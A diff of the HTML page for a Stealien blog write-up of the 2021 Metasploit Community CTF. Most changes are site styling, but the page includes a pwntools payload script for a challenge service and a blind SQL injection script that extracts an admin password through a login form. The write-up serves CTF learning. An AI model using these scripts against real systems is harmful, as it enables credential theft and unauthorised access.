@@ -1,17 +1,18 @@
 <!DOCTYPE html>
 <html lang="en">
 <head><meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5">
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta property="og:type" content="article">
 <meta property="og:image" content="http://ufo.stealien.com/assets/og_image.png">
-<meta property="og:title" content="STEALIEN Technical Blog">
+<meta property="og:title" content="STEALIEN Tech">
 <meta property="og:description" content="2021 Metasploit Community CTF write-up, review">
-<link href="https://fonts.googleapis.com/css?family=Nunito+Sans:400,400i,700&display=swap" rel="stylesheet">
 <title>2021 Metasploit Community CTF write-up, review</title>
-<!-- Begin Jekyll SEO tag v2.7.1 -->
-<title>2021 Metasploit Community CTF write-up, review | STEALIEN Technical Blog</title>
-<meta name="generator" content="Jekyll v4.2.0" />
+<link rel="icon" type="image/png" href="/assets/favicon.png">
+<link rel="apple-touch-icon" href="/assets/favicon.png">
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>2021 Metasploit Community CTF write-up, review | STEALIEN Tech</title>
+<meta name="generator" content="Jekyll v4.4.1" />
 <meta property="og:title" content="2021 Metasploit Community CTF write-up, review" />
 <meta name="author" content="김도현" />
 <meta property="og:locale" content="ko" />
@@ -19,53 +20,49 @@
 <meta property="og:description" content="2021 Metasploit Community CTF write-up, review" />
 <link rel="canonical" href="http://ufo.stealien.com/2021-12-07/Metasploit-CTF-Review" />
 <meta property="og:url" content="http://ufo.stealien.com/2021-12-07/Metasploit-CTF-Review" />
-<meta property="og:site_name" content="STEALIEN Technical Blog" />
+<meta property="og:site_name" content="STEALIEN Tech" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2021-12-07T01:30:00+09:00" />
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="2021 Metasploit Community CTF write-up, review" />
 <script type="application/ld+json">
-{"url":"http://ufo.stealien.com/2021-12-07/Metasploit-CTF-Review","author":{"@type":"Person","name":"김도현"},"description":"2021 Metasploit Community CTF write-up, review","@type":"BlogPosting","dateModified":"2021-12-07T01:30:00+09:00","datePublished":"2021-12-07T01:30:00+09:00","headline":"2021 Metasploit Community CTF write-up, review","mainEntityOfPage":{"@type":"WebPage","@id":"http://ufo.stealien.com/2021-12-07/Metasploit-CTF-Review"},"@context":"https://schema.org"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"김도현"},"dateModified":"2021-12-07T01:30:00+09:00","datePublished":"2021-12-07T01:30:00+09:00","description":"2021 Metasploit Community CTF write-up, review","headline":"2021 Metasploit Community CTF write-up, review","mainEntityOfPage":{"@type":"WebPage","@id":"http://ufo.stealien.com/2021-12-07/Metasploit-CTF-Review"},"url":"http://ufo.stealien.com/2021-12-07/Metasploit-CTF-Review"}</script>
 <!-- End Jekyll SEO tag -->
 
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name=“naver-site-verification” content=“74a9ec74d48a1ffca92bf9ac4704ba73be9afd65" />
+<meta name="naver-site-verification" content="74a9ec74d48a1ffca92bf9ac4704ba73be9afd65" />
 <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous"/>
 <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
 <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
 <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
 <link rel="stylesheet" href="/assets/css/style.css">
+<link href="/assets/css/syntax.css" rel="stylesheet">
 
-<link href="https://fonts.googleapis.com/css2?family=Nanum+Gothic:wght@400;700;800&display=swap" rel="stylesheet">
-
-<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/styles/default.min.css">
-<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/highlight.min.js"></script>
-
-<link href="/assets/css/syntax.css" rel="stylesheet" >
-
-
-<!-- Global site tag (gtag.js) - Google Analytics -->
+<!-- Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-06FFJEF76M"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
-
   gtag('config', 'G-06FFJEF76M');
 </script>
 </head>
 <body>
 	<header>
 		<div class="container"></div><div id="header">
-    <div class="container" style="display: flex;justify-content: space-between;">
+    <div class="container" style="display: flex; justify-content: space-between; align-items: center;">
         <a href="/">
             <img
                 class="header_image_logo"
                 src="/assets/logo.png"
-                style="width: 140px; margin: 20px 28px 0px;"
+                style="width: 130px; margin: 16px 28px;"
             />
         </a>
-        <a href="https://www.stealien.com/" target="_blank" style="font-family: 'NotoSansKR Medium', sans-serif;font-size: 14px;margin-right: 30px; color: #000; line-height: 70px;">스틸리언 홈페이지</a>
+        <a href="https://www.stealien.com/" target="_blank"
+           style="font-size: 13px; margin-right: 30px; color: var(--color-text-secondary); font-weight: 500; text-decoration: none; border-bottom: 1.5px solid transparent; padding-bottom: 2px; transition: all 0.2s;"
+           onmouseover="this.style.borderBottomColor='var(--color-accent)';this.style.color='var(--color-accent)'"
+           onmouseout="this.style.borderBottomColor='transparent';this.style.color='var(--color-text-secondary)'">
+            스틸리언 홈페이지
+        </a>
     </div>
 </div>
 </header>
@@ -143,7 +140,7 @@ flag_location=3e6f0e21-7faa-429f-8a1d-3f715a520da4.png
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
 </span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">OP_LSH</span> <span class="o">=</span> <span class="mh">0xc0</span>
 <span class="n">OP_RSH</span> <span class="o">=</span> <span class="mh">0xc1</span>
@@ -151,29 +148,29 @@ flag_location=3e6f0e21-7faa-429f-8a1d-3f715a520da4.png
 <span class="n">OP_DIV</span> <span class="o">=</span> <span class="mh">0xe0</span>
 <span class="n">OP_EXT</span> <span class="o">=</span> <span class="mh">0xff</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"localhost"</span><span class="p">,</span> <span class="mi">31337</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">localhost</span><span class="sh">"</span><span class="p">,</span> <span class="mi">31337</span><span class="p">)</span>
 
-<span class="n">payload</span>  <span class="o">=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x0006</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x0001</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x03</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x17</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x6d</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="n">OP_MUL</span><span class="p">)</span> <span class="c1"># 0x6d * 0x17 = 2507
-</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="n">OP_DIV</span><span class="p">)</span> <span class="c1"># 2507 / 3 = 835
-</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x01</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="n">OP_MUL</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x01</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="n">OP_MUL</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x01</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="n">OP_MUL</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="n">OP_EXT</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xadde</span><span class="p">)</span>
+<span class="n">payload</span>  <span class="o">=</span> <span class="nf">p16</span><span class="p">(</span><span class="mh">0x0006</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p16</span><span class="p">(</span><span class="mh">0x0001</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p8</span><span class="p">(</span><span class="mh">0x03</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p8</span><span class="p">(</span><span class="mh">0x17</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p8</span><span class="p">(</span><span class="mh">0x6d</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p8</span><span class="p">(</span><span class="n">OP_MUL</span><span class="p">)</span> <span class="c1"># 0x6d * 0x17 = 2507
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p8</span><span class="p">(</span><span class="n">OP_DIV</span><span class="p">)</span> <span class="c1"># 2507 / 3 = 835
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p8</span><span class="p">(</span><span class="mh">0x01</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p8</span><span class="p">(</span><span class="n">OP_MUL</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p8</span><span class="p">(</span><span class="mh">0x01</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p8</span><span class="p">(</span><span class="n">OP_MUL</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p8</span><span class="p">(</span><span class="mh">0x01</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p8</span><span class="p">(</span><span class="n">OP_MUL</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p8</span><span class="p">(</span><span class="n">OP_EXT</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p16</span><span class="p">(</span><span class="mh">0xadde</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvall</span><span class="p">()</span>
-<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'flag.png'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvall</span><span class="p">()</span>
+<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">flag.png</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">wb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
 </code></pre></div></div>
 
 <hr />
@@ -321,28 +318,28 @@ Completed.
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
 </span>
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">argparse</span>
-<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">argparse</span>
+<span class="kn">import</span> <span class="n">string</span>
 
 <span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
 
-    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">/login"</span>
-    <span class="n">pay</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"username=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;password=</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">"</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">/login</span><span class="sh">"</span>
+    <span class="n">pay</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">username=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;password=</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">"</span>
 
-    <span class="n">ses</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
-    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Request</span><span class="p">(</span>
-        <span class="n">method</span><span class="o">=</span><span class="s">'POST'</span><span class="p">,</span>
+    <span class="n">ses</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
+    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Request</span><span class="p">(</span>
+        <span class="n">method</span><span class="o">=</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">,</span>
         <span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span>
         <span class="n">data</span><span class="o">=</span><span class="n">pay</span><span class="p">,</span>
-        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/x-www-form-urlencoded'</span><span class="p">}</span>
+        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">Content-Type</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">application/x-www-form-urlencoded</span><span class="sh">'</span><span class="p">}</span>
     <span class="p">)</span>
 
-    <span class="n">pre</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">prepare</span><span class="p">()</span>
+    <span class="n">pre</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="nf">prepare</span><span class="p">()</span>
     <span class="n">pre</span><span class="p">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
     <span class="n">pre</span><span class="p">.</span><span class="n">body</span> <span class="o">=</span> <span class="n">pay</span>
 
-    <span class="n">response</span> <span class="o">=</span> <span class="n">ses</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">pre</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">ses</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">pre</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
     <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">303</span><span class="p">:</span>
         <span class="k">return</span> <span class="bp">False</span> <span class="c1"># login failed.
 </span>    <span class="k">else</span><span class="p">:</span>
@@ -351,17 +348,17 @@ Completed.
 <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
     
     <span class="n">db_name_len</span> <span class="o">=</span> <span class="mi">8</span>
-    <span class="n">db_name</span>     <span class="o">=</span> <span class="s">'postgres'</span>
-    <span class="n">table_name</span>  <span class="o">=</span> <span class="s">'registered_users'</span>
+    <span class="n">db_name</span>     <span class="o">=</span> <span class="sh">'</span><span class="s">postgres</span><span class="sh">'</span>
+    <span class="n">table_name</span>  <span class="o">=</span> <span class="sh">'</span><span class="s">registered_users</span><span class="sh">'</span>
 
-    <span class="n">payload_upper</span> <span class="o">=</span> <span class="s">''''+or+(select+ascii(substr((select+password+from+registered_users+limit+1+offset+0),{},1)))&gt;{}+--'''</span>
-    <span class="n">payload_lower</span> <span class="o">=</span> <span class="s">''''+or+(select+ascii(substr((select+password+from+registered_users+limit+1+offset+0),{},1)))&lt;{}+--'''</span>
-    <span class="n">payload_equal</span> <span class="o">=</span> <span class="s">''''+or+(select+ascii(substr((select+password+from+registered_users+limit+1+offset+0),{},1)))={}+--'''</span>
+    <span class="n">payload_upper</span> <span class="o">=</span> <span class="sh">''''</span><span class="s">+or+(select+ascii(substr((select+password+from+registered_users+limit+1+offset+0),{},1)))&gt;{}+--</span><span class="sh">'''</span>
+    <span class="n">payload_lower</span> <span class="o">=</span> <span class="sh">''''</span><span class="s">+or+(select+ascii(substr((select+password+from+registered_users+limit+1+offset+0),{},1)))&lt;{}+--</span><span class="sh">'''</span>
+    <span class="n">payload_equal</span> <span class="o">=</span> <span class="sh">''''</span><span class="s">+or+(select+ascii(substr((select+password+from+registered_users+limit+1+offset+0),{},1)))={}+--</span><span class="sh">'''</span>
 
     <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
-    <span class="n">password</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="sh">''</span>
 
-    <span class="k">while</span> <span class="ow">not</span> <span class="n">login</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="s">'admin'</span><span class="p">,</span> <span class="n">payload_equal</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)):</span>
+    <span class="k">while</span> <span class="ow">not</span> <span class="nf">login</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload_equal</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)):</span>
 
         <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>
         <span class="n">cmpmin</span> <span class="o">=</span> <span class="mh">0x20</span>
@@ -370,32 +367,32 @@ Completed.
 
         <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
 
-            <span class="k">if</span> <span class="n">login</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="s">'admin'</span><span class="p">,</span> <span class="n">payload_equal</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">cmpmid</span><span class="p">)):</span>
-                <span class="n">password</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">cmpmid</span><span class="p">)</span>
+            <span class="k">if</span> <span class="nf">login</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload_equal</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">cmpmid</span><span class="p">)):</span>
+                <span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">cmpmid</span><span class="p">)</span>
                 <span class="k">break</span>
 
-            <span class="k">elif</span> <span class="n">login</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="s">'admin'</span><span class="p">,</span> <span class="n">payload_upper</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">cmpmid</span><span class="p">)):</span>
+            <span class="k">elif</span> <span class="nf">login</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload_upper</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">cmpmid</span><span class="p">)):</span>
                 <span class="n">cmpmin</span> <span class="o">=</span> <span class="n">cmpmid</span> <span class="o">+</span> <span class="mi">1</span>
                 <span class="n">cmpmid</span> <span class="o">=</span> <span class="p">(</span><span class="n">cmpmax</span> <span class="o">+</span> <span class="n">cmpmin</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
 
-            <span class="k">elif</span> <span class="n">login</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="s">'admin'</span><span class="p">,</span> <span class="n">payload_lower</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">cmpmid</span><span class="p">)):</span>
+            <span class="k">elif</span> <span class="nf">login</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload_lower</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">cmpmid</span><span class="p">)):</span>
                 <span class="n">cmpmax</span> <span class="o">=</span> <span class="n">cmpmid</span> <span class="o">-</span> <span class="mi">1</span>
                 <span class="n">cmpmid</span> <span class="o">=</span> <span class="p">(</span><span class="n">cmpmax</span> <span class="o">+</span> <span class="n">cmpmin</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
 
             <span class="k">else</span><span class="p">:</span>
                 <span class="k">raise</span> <span class="nb">RuntimeError</span>
 
-        <span class="k">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
 
     <span class="k">return</span> <span class="n">password</span>
 
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
-    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
-    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"--host"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s">"localhost"</span><span class="p">)</span>
-    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"--port"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">31337</span><span class="p">)</span>
-    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
-    <span class="n">result</span> <span class="o">=</span> <span class="n">run</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">host</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"password: "</span> <span class="o">+</span> <span class="n">result</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">()</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">--host</span><span class="sh">"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="sh">"</span><span class="s">localhost</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">--port</span><span class="sh">"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">31337</span><span class="p">)</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="nf">run</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">host</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">password: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">result</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>and noticed that admin password is keep changing when revert machine.</p>
@@ -587,14 +584,13 @@ O:4:<span class="s2">"user"</span>:3:<span class="o">{</span>s:8:<span class="s2
         <div class="post-info">
             <span style="color: #545454" class="post-author-mobile">
                 이승용
-                <span style="color: #f5f5f5; margin: 2px">|</span>
             </span>
             Jan 26, 2026
-            <span style="color: #f5f5f5; margin: 2px">|</span>
-            <span>CTI</span>
+            <span class="post-category-badge">CTI</span>
         </div>
     </div>
-</div><div class="row">
+</div>
+<div class="row">
     <div class="col-sm-2 col-md-2">
         <div class="profile">
             <img src="/assets/stealien_inverse.png" class="profile_image" />
@@ -611,24 +607,20 @@ O:4:<span class="s2">"user"</span>:3:<span class="o">{</span>s:8:<span class="s2
         <div class="post-info">
             <span style="color: #545454" class="post-author-mobile">
                 김도환, 조준형
-                <span style="color: #f5f5f5; margin: 2px">|</span>
             </span>
             Apr 22, 2025
-            <span style="color: #f5f5f5; margin: 2px">|</span>
-            <span>R&D</span>
+            <span class="post-category-badge">R&D</span>
         </div>
     </div>
 </div>
+
         </div>
     </div>
 </div>
 		</div>
 	</section><footer>
-  <div class="container" style="display: flex; justify-content: space-between;">
-    <!-- <a href="#top">
-      <img src="/assets/white_logo.png" class="footer-logo" />
-    </a> -->
-    <div class="footer-copyright">Copyright &copy; Stealien Inc.</div>
+  <div class="container" style="display: flex; justify-content: space-between; align-items: center;">
+    <div class="footer-copyright">&copy; 2026 Stealien Inc.</div>
     <div class="footer-icons">
       <a target="_blank" href="https://twitter.com/stealien"><img class="sns" src="/assets/icons/twitter_ic.png"/></a>
       <a target="_blank" href="https://blog.naver.com/stealien_official"><img class="sns" src="/assets/icons/blog_ic.png"/></a>
@@ -636,5 +628,6 @@ O:4:<span class="s2">"user"</span>:3:<span class="o">{</span>s:8:<span class="s2
       <a target="_blank" href="https://www.youtube.com/c/STEALIEN"><img class="sns" src="/assets/icons/youtube_ic.png"/></a>
     </div>
   </div>
-</footer></body>
+</footer>
+</body>
 </html>
